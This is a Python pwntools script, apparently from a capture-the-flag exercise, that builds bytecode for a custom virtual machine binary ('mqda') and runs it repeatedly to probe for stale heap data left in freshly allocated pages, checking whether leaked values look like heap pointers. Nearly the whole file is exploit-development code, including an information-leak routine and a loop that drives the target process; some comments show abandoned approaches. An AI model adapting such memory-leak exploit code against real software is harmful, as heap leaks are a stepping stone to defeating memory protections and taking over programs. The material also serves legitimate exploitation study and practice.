#!/usr/bin/env python3
"""
Exploit: Try to get stale heap data by allocating, freeing, reallocating
"""
from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'error'

def hlt():
    return bytes([0x00])

def mov_reg_imm(reg, imm32):
    return bytes([0x41, reg]) + p32(imm32)

def push_reg(reg):
    return bytes([0x02, reg])

def pop_reg(reg):
    return bytes([0x03, reg])

def sub_reg_imm(reg, imm32):
    return bytes([0x45, reg]) + p32(imm32)

def shr_reg_imm(reg, imm32):
    return bytes([0x4c, reg]) + p32(imm32)

def shl_reg_imm(reg, imm32):
    return bytes([0x4b, reg]) + p32(imm32)

def cmp_reg_reg(reg1, reg2):
    return bytes([0x2d, reg1, reg2])

def jne_reg(reg):
    return bytes([0x10, reg])

def trigger_illegal():
    return bytes([0xFF])

def make_zero_page(page_addr):
    """Create code to zero out a page (so it gets freed)."""
    code = b''
    # Write 0 to every 4-byte location in the page
    # Page data is at offset 4, total 256 bytes = 64 dwords
    code += mov_reg_imm(0, 0)  # r0 = 0
    for offset in range(64):
        code += mov_reg_imm(15, page_addr + offset * 4)
        code += push_reg(0)  # Write 0
    return code

def create_leak_code(target_read_addr):
    """
    Create code that:
    1. Allocates some pages with non-zero data
    2. Zeros out one page (causing it to be freed)
    3. Allocates a new page at different address (might reuse freed chunk)
    4. Reads from the new page to see stale tcache data
    5. Returns TERMINATED if the data matches expected pattern
    """
    code = b''
    
    # Allocate page 0x0000 with non-zero data (our code lives here)
    # This page is auto-allocated when we write code at address 0
    
    # Allocate page 0x1000 with non-zero data
    code += mov_reg_imm(15, 0x1000)
    code += mov_reg_imm(0, 0xAAAAAAAA)
    code += push_reg(0)
    
    # Allocate page 0x2000 and zero it out to trigger free
    # Actually, we need to write zeros to the entire page data (256 bytes)
    # This is too many instructions... Let me simplify
    
    # Alternative: just read from a high address and see what's there
    # The page will be allocated fresh, containing heap garbage
    
    # Read from page 0x3000
    code += mov_reg_imm(15, 0x3000)
    code += pop_reg(0)  # r0 = stale data from page 0x3000
    
    # Check if it looks like a heap address (high bytes are 0x55 or 0x56)
    # Shift right by 24 to get byte 3 (bits 24-31)
    code += shr_reg_imm(0, 24)
    
    # Compare with 0x55
    code += mov_reg_imm(1, 0x55)
    code += cmp_reg_reg(0, 1)
    
    # If equal, jump to HLT
    current = len(code)
    hlt_offset = current + 6 + 2 + 1
    code += mov_reg_imm(2, hlt_offset)
    code += jne_reg(2)  # JNE jumps when EQUAL (inverted)
    code += trigger_illegal()
    code += hlt()
    
    return code

def main():
    print("[*] Testing for stale heap data...")
    
    code = create_leak_code(0x3000)
    print(f"[*] Code length: {len(code)}")
    
    for trial in range(5):
        p = process(['./mqda'])
        p.recvuntil(b'Code Address> ')
        p.sendline(b'0')
        p.recvuntil(b'Code Length> ')
        p.sendline(str(len(code)).encode())
        p.recvuntil(b'Code> ')
        p.send(code)
        p.recvuntil(b'Entry IP> ')
        p.sendline(b'0')
        
        output = p.recvall(timeout=2)
        result = "heap addr (0x55)" if b'TERMINATED' in output else "not 0x55"
        print(f"[*] Trial {trial}: {result}")
        p.close()

if __name__ == '__main__':
    main()
